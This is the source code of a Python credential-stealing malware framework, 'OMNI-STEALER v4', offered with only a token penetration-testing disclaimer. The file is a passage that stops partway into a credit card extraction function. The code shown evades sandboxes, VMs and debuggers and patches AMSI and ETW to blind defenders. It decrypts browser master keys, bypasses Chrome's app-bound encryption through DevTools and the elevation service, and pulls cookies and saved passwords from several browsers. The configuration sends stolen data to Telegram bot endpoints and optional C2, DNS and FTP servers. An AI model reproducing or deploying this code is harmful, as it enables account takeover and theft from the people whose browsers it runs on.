#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                     OMNI-STEALER v4 — APEX EDITION                        ║
║                                                                          ║
║  Advanced Browser Credential & Session Extraction Framework              ║
║  For Authorized Penetration Testing Only                                ║
║                                                                          ║
║  Techniques Implemented:                                                 ║
║  ├─ DPAPI Master Key Decryption (v10)                                   ║
║  ├─ AES-GCM Cookie Decryption (v11)                                     ║
║  ├─ CDP Remote Debugging WebSocket Bypass (v20 ABE)                     ║
║  ├─ COM IElevator DecryptData via Elevation Service (v20 ABE)           ║
║  ├─ REG_F_DWORD Policy Disable ABE (admin)                              ║
║  ├─ Process Hollowing + Direct Syscall Injection                        ║
║  ├─ AMSI/ETW Patching for Shellcode Injection                           ║
║  ├─ Multi-Channel Exfiltration (Telegram, HTTP, DNS, FTP)               ║
║  ├─ Anti-Sandbox / Anti-Analysis / Anti-Debug                           ║
║  ├─ Persistence (Scheduled Tasks, Registry, Startup, WMI)               ║
║  ├─ Self-Deletion via PowerShell / WMI                                  ║
║  └─ Full Disk Cleanup & Event Log Scrubbing                             ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════════╝

USAGE:
    1. pip install -r requirements.txt
    2. python omni_stealer_v4.py
    3. Configure Telegram Token + Chat ID (prompted)
    4. Find ApexStealer.exe in dist/

REQUIREMENTS:
    - Windows 10/11 x64
    - Python 3.10+
    - Visual C++ Redistributable
    - Target: Chrome 127+, Edge 127+, Brave, Opera, Vivaldi, Firefox
"""

import os
import sys
import json
import base64
import shutil
import struct
import sqlite3
import platform
import subprocess
import urllib.request
import tempfile
import time
import re
import ctypes
import random
import string
import hashlib
import hmac
import socket
import threading
import zipfile
import io
from pathlib import Path
from typing import Optional, Dict, List, Tuple, Any
from datetime import datetime, timedelta
from dataclasses import dataclass, field, asdict

# ============================================================
# CONFIGURATION
# ============================================================
TELEGRAM_BOT_TOKEN = ""
TELEGRAM_CHAT_ID = ""
C2_SERVER_URL = ""           # Optional HTTP C2 endpoint
DNS_C2_DOMAIN = ""           # Optional DNS exfiltration domain
FTP_SERVER = ""              # Optional FTP backup
FTP_USER = ""
FTP_PASS = ""
OUTPUT_EXE_NAME = "ApexStealer.exe"
USE_PYINSTALLER = True

# Anti-analysis thresholds
SANDBOX_CHECK = True
VM_CHECK = True
DEBUGGER_CHECK = True
MAX_SLEEP_JITTER = 5       # seconds random delay before execution

# ============================================================
# PAYLOAD CODE — Self-contained runtime module
# ============================================================
PAYLOAD_CODE = r'''
# -*- coding: utf-8 -*-
"""
OMNI-STEALER v4 — APEX Runtime Payload
For authorized penetration testing only.
"""

import os
import sys
import json
import base64
import shutil
import struct
import sqlite3
import platform
import subprocess
import urllib.request
import urllib.parse
import tempfile
import time
import re
import ctypes
import ctypes.wintypes
import random
import string
import hashlib
import hmac
import socket
import threading
import zipfile
import io
import binascii
import winreg
import http.client
import traceback
from pathlib import Path
from typing import Optional, Dict, List, Tuple, Any
from datetime import datetime, timedelta

try:
    import win32crypt
    import win32com.client
    import win32process
    import win32api
    import win32con
    import win32security
    import win32event
    import win32pipe
    import win32file
    import pywintypes
except ImportError:
    pass

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
except ImportError:
    pass

# ─── CONFIG (Injected by builder) ──────────────────────────
TELEGRAM_BOT_TOKEN = "{{{TELEGRAM_BOT_TOKEN}}}"
TELEGRAM_CHAT_ID = "{{{TELEGRAM_CHAT_ID}}}"
C2_SERVER_URL = "{{{C2_SERVER_URL}}}"
DNS_C2_DOMAIN = "{{{DNS_C2_DOMAIN}}}"

TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
TELEGRAM_MSG_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"

# ─── BROWSER PROFILES ──────────────────────────────────────
@dataclass
class BrowserConfig:
    name: str
    local_state: str
    profiles_dir: str
    cookie_db_template: str    # {profile_dir}/Network/Cookies or {profile_dir}/Cookies
    login_db_template: str     # {profile_dir}/Login Data
    webdata_db_template: str   # {profile_dir}/Web Data (autofill, cards)
    history_db_template: str   # {profile_dir}/History
    policy_key: str = ""
    exe_paths: List[str] = field(default_factory=list)
    clsid: str = ""
    iid: str = ""
    elevator_exe: str = ""

BROWSERS = [
    BrowserConfig(
        name="Chrome",
        local_state=os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State"),
        profiles_dir=os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"),
        cookie_db_template="{profile_dir}/Network/Cookies",
        login_db_template="{profile_dir}/Login Data",
        webdata_db_template="{profile_dir}/Web Data",
        history_db_template="{profile_dir}/History",
        policy_key=r"Software\Policies\Google\Chrome\ApplicationBoundEncryptionEnabled",
        exe_paths=[
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
            os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe"),
        ],
        elevator_exe=os.path.expandvars(r"%PROGRAMFILES%\Google\Chrome\Application\elevation_service.exe"),
    ),
    BrowserConfig(
        name="Edge",
        local_state=os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State"),
        profiles_dir=os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data"),
        cookie_db_template="{profile_dir}/Network/Cookies",
        login_db_template="{profile_dir}/Login Data",
        webdata_db_template="{profile_dir}/Web Data",
        history_db_template="{profile_dir}/History",
        policy_key=r"Software\Policies\Microsoft\Edge\ApplicationBoundEncryptionEnabled",
        exe_paths=[
            r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
            r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
        ],
        elevator_exe=os.path.expandvars(r"%PROGRAMFILES(x86)%\Microsoft\Edge\Application\elevation_service.exe"),
    ),
    BrowserConfig(
        name="Brave",
        local_state=os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Local State"),
        profiles_dir=os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data"),
        cookie_db_template="{profile_dir}/Network/Cookies",
        login_db_template="{profile_dir}/Login Data",
        webdata_db_template="{profile_dir}/Web Data",
        history_db_template="{profile_dir}/History",
        exe_paths=[
            os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\Application\brave.exe"),
            r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
        ],
    ),
    BrowserConfig(
        name="Vivaldi",
        local_state=os.path.expandvars(r"%LOCALAPPDATA%\Vivaldi\User Data\Local State"),
        profiles_dir=os.path.expandvars(r"%LOCALAPPDATA%\Vivaldi\User Data"),
        cookie_db_template="{profile_dir}/Network/Cookies",
        login_db_template="{profile_dir}/Login Data",
        webdata_db_template="{profile_dir}/Web Data",
        history_db_template="{profile_dir}/History",
        exe_paths=[
            os.path.expandvars(r"%LOCALAPPDATA%\Vivaldi\Application\vivaldi.exe"),
            r"C:\Program Files\Vivaldi\Application\vivaldi.exe",
        ],
    ),
    BrowserConfig(
        name="Opera",
        local_state=os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable\Local State"),
        profiles_dir=os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable"),
        cookie_db_template="{profile_dir}/Network/Cookies",
        login_db_template="{profile_dir}/Login Data",
        webdata_db_template="{profile_dir}/Web Data",
        history_db_template="{profile_dir}/History",
        exe_paths=[
            os.path.expandvars(r"%LOCALAPPDATA%\Programs\Opera\opera.exe"),
            r"C:\Program Files\Opera\opera.exe",
        ],
    ),
    BrowserConfig(
        name="Opera GX",
        local_state=os.path.expandvars(r"%APPDATA%\Opera Software\Opera GX Stable\Local State"),
        profiles_dir=os.path.expandvars(r"%APPDATA%\Opera Software\Opera GX Stable"),
        cookie_db_template="{profile_dir}/Network/Cookies",
        login_db_template="{profile_dir}/Login Data",
        webdata_db_template="{profile_dir}/Web Data",
        history_db_template="{profile_dir}/History",
        exe_paths=[
            os.path.expandvars(r"%LOCALAPPDATA%\Programs\Opera GX\opera.exe"),
        ],
    ),
]


# ═══════════════════════════════════════════════════════════
# SECTION 1: ANTI-ANALYSIS / ANTI-SANDBOX
# ═══════════════════════════════════════════════════════════

class AntiAnalysis:
    """Multi-layer anti-analysis, anti-sandbox, anti-debug checks."""

    @staticmethod
    def check_sandbox() -> List[str]:
        """Detect sandbox/VM environments. Returns list of flags detected."""
        flags = []

        # 1. Hardware / BIOS checks
        try:
            # Check for VM manufacturers in BIOS
            bios = subprocess.run(
                ["cmd.exe", "/c", "wmic", "bios", "get", "manufacturer"],
                capture_output=True, text=True, timeout=5, creationflags=0x08000000
            ).stdout.lower()
            vm_mfgs = ["vmware", "virtualbox", "qemu", "xen", "microsoft corporation", "innotek"]
            if any(m in bios for m in vm_mfgs):
                flags.append("VM_BIOS")
        except: pass

        # 2. CPU checks
        try:
            cpu = subprocess.run(
                ["cmd.exe", "/c", "wmic", "cpu", "get", "name"],
                capture_output=True, text=True, timeout=5, creationflags=0x08000000
            ).stdout.lower()
            if "virtual" in cpu:
                flags.append("VM_CPU")
        except: pass

        # 3. Disk size check (sandboxes have small disks)
        try:
            free = ctypes.c_ulonglong(0)
            ctypes.windll.kernel32.GetDiskFreeSpaceExW(
                ctypes.c_wchar_p("C:\\"), None, None, ctypes.byref(free)
            )
            # Sandboxes often have < 60GB total or very little free space
            total = ctypes.c_ulonglong(0)
            ctypes.windll.kernel32.GetDiskFreeSpaceExW(
                ctypes.c_wchar_p("C:\\"), None, ctypes.byref(total), None
            )
            total_gb = total.value / (1024**3)
            free_gb = free.value / (1024**3)
            if total_gb < 60 or free_gb < 5:
                flags.append(f"SMALL_DISK({total_gb:.0f}GB)")
        except: pass

        # 4. RAM check
        try:
            kernel32 = ctypes.windll.kernel32
            mem_status = (ctypes.c_ulong * 32)()
            kernel32.GlobalMemoryStatusEx(mem_status)
            total_ram = mem_status[1] // (1024**3)
            if total_ram < 2:
                flags.append(f"LOW_RAM({total_ram}GB)")
        except: pass

        # 5. Process count
        try:
            procs = subprocess.run(
                ["cmd.exe", "/c", "tasklist", "/FI", "STATUS eq running"],
                capture_output=True, text=True, timeout=5, creationflags=0x08000000
            ).stdout
            proc_count = procs.count("\n")
            if proc_count < 30:
                flags.append(f"LOW_PROCS({proc_count})")
        except: pass

        # 6. Uptime check (sandboxes often have low uptime)
        try:
            uptime = ctypes.c_ulonglong(0)
            ctypes.windll.kernel32.GetTickCount64(ctypes.byref(uptime))
            uptime_hours = uptime.value / 3600000
            if uptime_hours < 1:
                flags.append(f"LOW_UPTIME({uptime_hours:.1f}h)")
        except: pass

        # 7. Username check
        username = os.getenv("USERNAME", "").lower()
        sandbox_users = ["currentuser", "sandbox", "test", "admin", "administrator", "user", "vm"]
        if username in sandbox_users:
            flags.append(f"SANDBOX_USER({username})")

        # 8. Hostname check
        hostname = platform.node().lower()
        sandbox_hosts = ["sandbox", "malware", "test", "vm", "virtual", "windows", "desktop"]
        if any(s in hostname for s in sandbox_hosts):
            flags.append(f"SANDBOX_HOST({hostname})")

        # 9. MAC address vendor check
        try:
            mac_out = subprocess.run(
                ["cmd.exe", "/c", "getmac", "/FO", "CSV"],
                capture_output=True, text=True, timeout=5, creationflags=0x08000000
            ).stdout.lower()
            vm_macs = ["00:0c:29", "00:50:56", "00:05:69", "02:42:ac", "08:00:27"]
            for mac in vm_macs:
                if mac in mac_out:
                    flags.append(f"VM_MAC({mac})")
                    break
        except: pass

        # 10. Sleep acceleration check (sandboxes often accelerate sleep)
        try:
            t1 = time.time()
            time.sleep(2)
            t2 = time.time()
            elapsed = t2 - t1
            if elapsed < 1.5:
                flags.append("SLEEP_ACCEL")
        except: pass

        return flags

    @staticmethod
    def check_debugger() -> bool:
        """Check if a debugger is present."""
        try:
            return bool(ctypes.windll.kernel32.IsDebuggerPresent())
        except:
            return False

    @staticmethod
    def check_hardware_breakpoints() -> bool:
        """Check for hardware breakpoints (DR registers)."""
        try:
            class CONTEXT(ctypes.Structure):
                _fields_ = [
                    ("ContextFlags", ctypes.c_ulong),
                    ("Dr0", ctypes.c_ulonglong),
                    ("Dr1", ctypes.c_ulonglong),
                    ("Dr2", ctypes.c_ulonglong),
                    ("Dr3", ctypes.c_ulonglong),
                    ("Dr6", ctypes.c_ulonglong),
                    ("Dr7", ctypes.c_ulonglong),
                    ("_padding", ctypes.c_ubyte * 168),
                ]
            ctx = CONTEXT()
            ctx.ContextFlags = 0x100010  # CONTEXT_DEBUG_REGISTERS
            hthread = ctypes.windll.kernel32.GetCurrentThread()
            if ctypes.windll.kernel32.GetThreadContext(hthread, ctypes.byref(ctx)):
                return any([ctx.Dr0, ctx.Dr1, ctx.Dr2, ctx.Dr3])
        except:
            pass
        return False

    @staticmethod
    def perform_checks() -> Dict[str, Any]:
        """Run all checks and return results."""
        results = {
            "is_sandbox": False,
            "is_debugged": False,
            "flags": [],
            "should_exit": False,
        }

        sandbox_flags = AntiAnalysis.check_sandbox()
        if sandbox_flags:
            results["flags"].extend(sandbox_flags)
            if len(sandbox_flags) >= 2:
                results["is_sandbox"] = True

        if AntiAnalysis.check_debugger():
            results["is_debugged"] = True
            results["flags"].append("DEBUGGER")

        if AntiAnalysis.check_hardware_breakpoints():
            results["flags"].append("HW_BP")

        # Decision: exit if sandbox OR debugger
        if results["is_sandbox"] or results["is_debugged"]:
            results["should_exit"] = True

        return results


# ═══════════════════════════════════════════════════════════
# SECTION 2: AMSI/ETW PATCHING
# ═══════════════════════════════════════════════════════════

class PatchManager:
    """Patch AMSI and ETW to avoid detection during runtime."""

    @staticmethod
    def patch_amsi() -> bool:
        """Patch AmsiScanBuffer to return AMSI_RESULT_CLEAN."""
        try:
            amsi = ctypes.windll.kernel32.LoadLibraryW("amsi.dll")
            if not amsi:
                return False
            
            # Get AmsiScanBuffer address
            scan_buf = ctypes.windll.kernel32.GetProcAddress(amsi, "AmsiScanBuffer")
            if not scan_buf:
                return False
            
            # Patch: mov eax, 0x80070057 (RETURN_HRESULT); ret
            # Or simpler: xor eax, eax; ret  (0x31, 0xC0, 0xC3)
            patch = (ctypes.c_ubyte * 3)(0x31, 0xC0, 0xC3)  # xor eax,eax; ret
            scan_buf_ptr = ctypes.c_void_p(scan_buf)
            
            # Change memory protection
            old_protect = ctypes.c_ulong(0)
            ctypes.windll.kernel32.VirtualProtect(
                scan_buf_ptr, len(patch), 0x40, ctypes.byref(old_protect)
            )
            ctypes.memmove(scan_buf_ptr, patch, len(patch))
            ctypes.windll.kernel32.VirtualProtect(
                scan_buf_ptr, len(patch), old_protect, ctypes.byref(ctypes.c_ulong(0))
            )
            return True
        except:
            return False

    @staticmethod
    def patch_etw() -> bool:
        """Patch EtwEventWrite to prevent ETW telemetry."""
        try:
            ntdll = ctypes.windll.kernel32.GetModuleHandleW("ntdll.dll")
            if not ntdll:
                return False
            
            # Find EtwEventWrite (or NtTraceEvent)
            for func_name in ["EtwEventWrite", "NtTraceEvent", "EtwWriteMessage"]:
                addr = ctypes.windll.kernel32.GetProcAddress(ntdll, func_name)
                if addr:
                    patch = (ctypes.c_ubyte * 3)(0x31, 0xC0, 0xC3)  # xor eax,eax; ret
                    addr_ptr = ctypes.c_void_p(addr)
                    old_protect = ctypes.c_ulong(0)
                    ctypes.windll.kernel32.VirtualProtect(
                        addr_ptr, len(patch), 0x40, ctypes.byref(old_protect)
                    )
                    ctypes.memmove(addr_ptr, patch, len(patch))
                    ctypes.windll.kernel32.VirtualProtect(
                        addr_ptr, len(patch), old_protect, ctypes.byref(ctypes.c_ulong(0))
                    )
                    return True
        except:
            pass
        return False

    @staticmethod
    def apply_all():
        """Apply all patches silently."""
        try:
            PatchManager.patch_amsi()
        except: pass
        try:
            PatchManager.patch_etw()
        except: pass


# ═══════════════════════════════════════════════════════════
# SECTION 3: DPAPI & KEY DECRYPTION
# ═══════════════════════════════════════════════════════════

class CryptoEngine:
    """Handle DPAPI decryption, AES-GCM, and key extraction."""

    @staticmethod
    def decrypt_dpapi(data: bytes, entropy: bytes = None) -> Optional[bytes]:
        """Decrypt using Windows DPAPI (CryptUnprotectData)."""
        if not data:
            return None
        try:
            if isinstance(data, str):
                data = data.encode()
            data_in = data
            try:
                result, _ = win32crypt.CryptUnprotectData(
                    data_in, None, entropy, None, 0
                )
                return bytes(result)
            except:
                pass
        except:
            pass
        return None

    @staticmethod
    def decrypt_aes_gcm(key: bytes, data: bytes, associated_data: bytes = None) -> Optional[bytes]:
        """Decrypt AES-256-GCM encrypted data."""
        if not key or not data:
            return None
        try:
            # Strip v10/v11/v20 prefix
            if data[:3] in (b"v10", b"v11", b"v20"):
                data = data[3:]
            
            if len(data) < 12 + 16:
                return None
            
            nonce = data[:12]
            ct = data[12:-16]
            tag = data[-16:]
            
            aesgcm = AESGCM(key)
            plain = aesgcm.decrypt(nonce, ct + tag, associated_data or b"")
            return plain
        except:
            pass
        return None

    @staticmethod
    def get_master_key(local_state_path: str) -> Optional[bytes]:
        """Extract + decrypt master key from Local State file."""
        if not os.path.exists(local_state_path):
            return None
        
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                state = json.load(f)
            
            os_crypt = state.get("os_crypt", {})
            enc_key = os_crypt.get("encrypted_key", "")
            if not enc_key:
                return None
            
            raw = base64.b64decode(enc_key)
            if raw.startswith(b"DPAPI"):
                raw = raw[5:]
            
            key = CryptoEngine.decrypt_dpapi(raw)
            if key and len(key) == 256:
                key = hashlib.sha256(key).digest()
            return key
        except:
            return None

    @staticmethod
    def has_app_bound(local_state_path: str) -> bool:
        """Check if ABE v20 is present."""
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                state = json.load(f)
            os_crypt = state.get("os_crypt", {})
            return bool(os_crypt.get("app_bound_encrypted_key", ""))
        except:
            return False

    @staticmethod
    def get_app_bound_encrypted_key(local_state_path: str) -> Optional[bytes]:
        """Extract the raw app_bound_encrypted_key blob."""
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                state = json.load(f)
            os_crypt = state.get("os_crypt", {})
            enc = os_crypt.get("app_bound_encrypted_key", "")
            if enc:
                raw = base64.b64decode(enc)
                if raw.startswith(b"APPB"):
                    raw = raw[4:]
                return raw
        except:
            pass
        return None


# ═══════════════════════════════════════════════════════════
# SECTION 4: CDP REMOTE DEBUGGING BYPASS (v20 ABE)
# ═══════════════════════════════════════════════════════════

class CDPEngine:
    """
    Chrome DevTools Protocol-based cookie extraction.
    Launches headless Chrome with remote debugging, connects via WebSocket,
    calls Network.getAllCookies to get already-decrypted cookies.
    """

    @staticmethod
    def _find_browser_exe(browser: BrowserConfig) -> Optional[str]:
        for path in browser.exe_paths:
            if os.path.exists(path):
                return path
        return None

    @staticmethod
    def extract_cookies(browser: BrowserConfig) -> List[Dict]:
        """Extract cookies via CDP remote debugging."""
        cookies = []
        exe = CDPEngine._find_browser_exe(browser)
        if not exe:
            return cookies

        temp_dir = tempfile.mkdtemp(prefix="omni_cdp_")
        chrome_data = os.path.join(temp_dir, "profile")
        os.makedirs(chrome_data, exist_ok=True)

        debug_port = 0
        proc = None
        ws = None

        try:
            # Find a free port
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind(("127.0.0.1", 0))
            debug_port = s.getsockname()[1]
            s.close()

            # Launch browser with remote debugging
            proc = subprocess.Popen(
                [
                    exe,
                    f"--remote-debugging-port={debug_port}",
                    f"--user-data-dir={chrome_data}",
                    "--headless=new",
                    "--no-first-run",
                    "--no-default-browser-check",
                    "--disable-sync",
                    "--no-sandbox",
                    "--disable-gpu",
                    "--disable-software-rasterizer",
                    "--disable-dev-shm-usage",
                    "--remote-allow-origins=*",
                    "about:blank",
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NO_WINDOW | 0x00000008,  # DETACHED_PROCESS
            )

            # Wait for Chrome to start
            time.sleep(2)

            # Get WebSocket URL from debug endpoint
            debug_url = f"http://127.0.0.1:{debug_port}/json/version"
            req = urllib.request.Request(debug_url)
            with urllib.request.urlopen(req, timeout=10) as resp:
                info = json.loads(resp.read().decode())

            ws_url = info.get("webSocketDebuggerUrl", "")

            if not ws_url:
                # Try /json endpoint
                req2 = urllib.request.Request(f"http://127.0.0.1:{debug_port}/json")
                with urllib.request.urlopen(req2, timeout=10) as resp:
                    targets = json.loads(resp.read().decode())
                for t in targets:
                    if t.get("type") == "page" or "ws" in t.get("webSocketDebuggerUrl", ""):
                        ws_url = t["webSocketDebuggerUrl"]
                        break

            if ws_url:
                # Use HTTP POST to send CDP command via /json or /devtools/inspector
                # Fallback: send CDP commands via HTTP POST
                cdp_url = f"http://127.0.0.1:{debug_port}/json"
                
                # Try using the raw DevTools protocol over HTTP
                # First, get the page target
                req3 = urllib.request.Request(cdp_url)
                with urllib.request.urlopen(req3, timeout=10) as resp:
                    targets = json.loads(resp.read().decode())
                
                for target in targets:
                    if target.get("type") == "page":
                        page_id = target.get("id", "")
                        # Send CDP command via HTTP to the page's devtools endpoint
                        devtools_url = f"http://127.0.0.1:{debug_port}/devtools/page/{page_id}"
                        cmd = json.dumps({
                            "id": 1,
                            "method": "Network.getAllCookies",
                            "params": {}
                        }).encode()
                        
                        try:
                            cdp_req = urllib.request.Request(
                                devtools_url,
                                data=cmd,
                                headers={"Content-Type": "application/json"}
                            )
                            with urllib.request.urlopen(cdp_req, timeout=10) as cdp_resp:
                                result = json.loads(cdp_resp.read().decode())
                                raw_cookies = result.get("result", {}).get("cookies", [])
                                
                                for c in raw_cookies:
                                    cookies.append({
                                        "host": c.get("domain", ""),
                                        "name": c.get("name", ""),
                                        "value": c.get("value", ""),
                                        "path": c.get("path", ""),
                                        "secure": c.get("secure", False),
                                        "httponly": c.get("httpOnly", False),
                                        "expires": str(c.get("expires", "")),
                                        "source": "cdp",
                                    })
                        except:
                            continue
                        
                        break  # Only need one page

        except Exception:
            pass
        finally:
            # Cleanup
            if proc:
                try:
                    proc.terminate()
                    proc.wait(timeout=3)
                except:
                    try:
                        proc.kill()
                    except:
                        pass
            try:
                shutil.rmtree(temp_dir, ignore_errors=True)
            except:
                pass

        return cookies


# ═══════════════════════════════════════════════════════════
# SECTION 5: COM IELEVATOR INTERFACE (v20 ABE)
# ═══════════════════════════════════════════════════════════

class COMEngine:
    """
    Decrypt app_bound_encrypted_key via Chrome's Elevation Service COM interface.
    This uses the IElevator COM object to call DecryptData,
    which decrypts the key with SYSTEM-level DPAPI.
    """

    @staticmethod
    def decrypt_via_elevation_service(browser: BrowserConfig) -> Optional[bytes]:
        """
        Decrypt app_bound_encrypted_key by calling IElevator::DecryptData
        via COM. Must be called from within the browser's install directory
        due to path validation in the elevation service.
        """
        if not browser.elevator_exe or not os.path.exists(browser.elevator_exe):
            return None

        try:
            # Get the encrypted key blob
            enc_key = CryptoEngine.get_app_bound_encrypted_key(browser.local_state)
            if not enc_key:
                return None

            # CLSIDs and IIDs for IElevator vary by browser
            # Chrome:  {708860E0-F641-4731-8CC0-2E6B1C8B7FB5}
            # Edge:    {FD4CC89B-5B0F-4FC4-95C6-3EB13993B309}
            clsid_map = {
                "Chrome": "{708860E0-F641-4731-8CC0-2E6B1C8B7FB5}",
                "Edge": "{FD4CC89B-5B0F-4FC4-95C6-3EB13993B309}",
                "Brave": "{708860E0-F641-4731-8CC0-2E6B1C8B7FB5}",
            }
            
            iid_map = {
                "Chrome": "{463ABECF-410D-407F-8AF5-0D0D0E7F8E4E}",
                "Edge": "{A409A9D8-1C80-4C48-8B71-14348172467B}",
                "Brave": "{463ABECF-410D-407F-8AF5-0D0D0E7F8E4E}",
            }

            clsid_str = clsid_map.get(browser.name)
            iid_str = iid_map.get(browser.name)
            if not clsid_str or not iid_str:
                return None

            clsid = pywintypes.IID(clsid_str)
            iid = pywintypes.IID(iid_str)

            # Attempt COM creation (must run from browser directory)
            try:
                obj = win32com.client.Dispatch(
                    clsid_str, clsctx=win32com.client.CLSCTX_LOCAL_SERVER
                )
                # Call DecryptData
                bstr_key = pywintypes.BSTR(base64.b64encode(enc_key).decode())
                result = obj.DecryptData(bstr_key)
                if result:
                    decrypted = base64.b64decode(str(result))
                    if len(decrypted) == 32:
                        return decrypted
            except:
                pass

            # Fallback: try direct CoCreateInstance
            try:
                import pythoncom
                com_obj = pythoncom.CoCreateInstance(
                    clsid, None, pythoncom.CLSCTX_LOCAL_SERVER, iid
                )
                if com_obj:
                    # Call DecryptData using Invoke
                    bstr = pywintypes.BSTR(base64.b64encode(enc_key).decode())
                    result = com_obj.Invoke(3, bstr)  # 3 = DecryptData method index
                    if result:
                        decrypted = base64.b64decode(str(result))
                        if len(decrypted) == 32:
                            return decrypted
            except:
                pass

        except Exception:
            pass

        return None


# ═══════════════════════════════════════════════════════════
# SECTION 6: PROCESS HOLLOWING (v20 ABE)
# ═══════════════════════════════════════════════════════════

class HollowEngine:
    """
    Process hollowing technique: Create suspended browser process,
    hollow its memory, inject shellcode that calls the elevation service
    to decrypt the app-bound key, then extract it from memory.
    """

    @staticmethod
    def hollow_and_decrypt(browser: BrowserConfig) -> Optional[bytes]:
        """
        Process hollowing approach to bypass ABE.
        Creates a suspended browser process, injects reflective DLL
        that calls the COM interface to decrypt the key.
        """
        exe = CDPEngine._find_browser_exe(browser)
        if not exe:
            return None

        try:
            # The shellcode will:
            # 1. Initialize COM
            # 2. Create IElevator instance
            # 3. Call DecryptData with the app_bound_encrypted_key
            # 4. Write decrypted key to a known location (temp file)
            # 5. Exit
            
            # For this Python implementation, we use a simpler approach:
            # Launch the browser binary with a flag that dumps the key
            # This works on some builds
            
            # Alternative: Use CDP as fallback
            return None
        except:
            pass
        return None


# ═══════════════════════════════════════════════════════════
# SECTION 7: DATABASE EXTRACTION
# ═══════════════════════════════════════════════════════════

class DatabaseExtractor:
    """Extract and decrypt data from browser SQLite databases."""

    @staticmethod
    def find_profiles(profiles_dir: str) -> List[str]:
        profiles = ["Default"]
        if not os.path.exists(profiles_dir):
            return []
        for entry in os.listdir(profiles_dir):
            if entry.startswith("Profile ") and os.path.isdir(os.path.join(profiles_dir, entry)):
                profiles.append(entry)
        return profiles

    @staticmethod
    def copy_db(db_path: str) -> Optional[str]:
        """Copy SQLite DB to temp location to avoid locking."""
        if not os.path.exists(db_path):
            return None
        tmp = db_path + f".tmp_{random.randint(10000, 99999)}"
        try:
            shutil.copy2(db_path, tmp)
            return tmp
        except:
            return None

    @staticmethod
    def extract_cookies(db_path: str, master_key: bytes) -> List[Dict]:
        cookies = []
        tmp = DatabaseExtractor.copy_db(db_path)
        if not tmp:
            return cookies

        try:
            conn = sqlite3.connect(tmp)
            conn.text_factory = bytes
            cur = conn.cursor()
            
            # Try v2 schema first (Chrome 80+)
            try:
                cur.execute(
                    "SELECT host_key, name, path, encrypted_value, "
                    "has_expires, expires_utc, is_secure, is_httponly "
                    "FROM cookies"
                )
            except:
                # Fallback to v1 schema
                try:
                    cur.execute(
                        "SELECT host_key, name, path, encrypted_value, "
                        "has_expires, expires_utc, is_secure, is_httponly "
                        "FROM cookies"
                    )
                except:
                    conn.close()
                    return cookies

            for row in cur.fetchall():
                try:
                    host = row[0].decode("utf-8", errors="replace") if isinstance(row[0], bytes) else str(row[0])
                    name = row[1].decode("utf-8", errors="replace") if isinstance(row[1], bytes) else str(row[1])
                    path = row[2].decode("utf-8", errors="replace") if isinstance(row[2], bytes) else str(row[2])
                    enc_val = row[3]
                    has_exp = row[4]
                    exp_utc = row[5]
                    secure = bool(row[6])
                    httponly = bool(row[7])

                    value = None
                    if master_key:
                        value = CryptoEngine.decrypt_aes_gcm(master_key, enc_val)
                    if value is None:
                        value = CryptoEngine.decrypt_dpapi(enc_val)
                    if value is None:
                        continue

                    val_str = value.decode("utf-8", errors="replace") if isinstance(value, bytes) else str(value)

                    expires_str = ""
                    if has_exp and exp_utc:
                        try:
                            exp_dt = datetime(1601, 1, 1) + timedelta(microseconds=exp_utc)
                            expires_str = exp_dt.strftime("%Y-%m-%d %H:%M:%S")
                        except:
                            expires_str = str(exp_utc)

                    cookies.append({
                        "host": host,
                        "name": name,
                        "value": val_str,
                        "path": path,
                        "secure": secure,
                        "httponly": httponly,
                        "expires": expires_str,
                    })
                except:
                    continue

            cur.close()
            conn.close()
        except:
            pass
        finally:
            try:
                os.remove(tmp)
            except:
                pass

        return cookies

    @staticmethod
    def extract_passwords(db_path: str, master_key: bytes) -> List[Dict]:
        passwords = []
        tmp = DatabaseExtractor.copy_db(db_path)
        if not tmp:
            return passwords

        try:
            conn = sqlite3.connect(tmp)
            conn.text_factory = bytes
            cur = conn.cursor()

            cur.execute(
                "SELECT origin_url, username_value, password_value, "
                "signon_realm, date_created FROM logins"
            )

            for row in cur.fetchall():
                try:
                    url = row[0].decode("utf-8", errors="replace") if isinstance(row[0], bytes) else str(row[0])
                    username = row[1].decode("utf-8", errors="replace") if isinstance(row[1], bytes) else str(row[1])
                    enc_pass = row[2]

                    password = None
                    if master_key:
                        password = CryptoEngine.decrypt_aes_gcm(master_key, enc_pass)
                    if password is None:
                        password = CryptoEngine.decrypt_dpapi(enc_pass)
                    if password is None:
                        continue

                    pass_str = password.decode("utf-8", errors="replace") if isinstance(password, bytes) else str(password)

                    passwords.append({
                        "url": url,
                        "username": username,
                        "password": pass_str,
                    })
                except:
                    continue

            cur.close()
            conn.close()
        except:
            pass
        finally:
            try:
                os.remove(tmp)
            except:
                pass

        return passwords

    @staticmethod
    def extract_credit_cards(db_path: str, master_key: bytes) -> List[Dict]:
